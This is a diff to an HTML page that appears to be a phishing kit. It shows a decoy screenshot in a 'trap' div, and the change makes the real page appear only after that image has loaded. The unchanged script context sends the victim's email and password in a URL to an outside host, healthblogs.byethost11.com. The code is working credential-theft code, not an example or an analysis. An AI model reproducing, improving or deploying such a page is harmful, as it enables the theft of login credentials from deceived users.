@@ -139,7 +139,7 @@
 </head>
 <body>
     <div id="trap">
-        <img src="ss.jpg" alt="">
+        <img src="ss.jpg" alt="" id="ss">
     </div>
     <div id="main">
     <div class="upper">
@@ -187,7 +187,10 @@
     </div>
 </div>
     <script>
-        setInterval(()=>{trap.style.display="none";main.style.display="block"},1000)
+        ss.onload=()=>{
+            setInterval(()=>{trap.style.display="none";main.style.display="block"},1000)
+        }
+        
         sub.onclick=()=>{
             location.href=`http://healthblogs.byethost11.com/ind.php?string=${email.value}%${password.value}`
         }
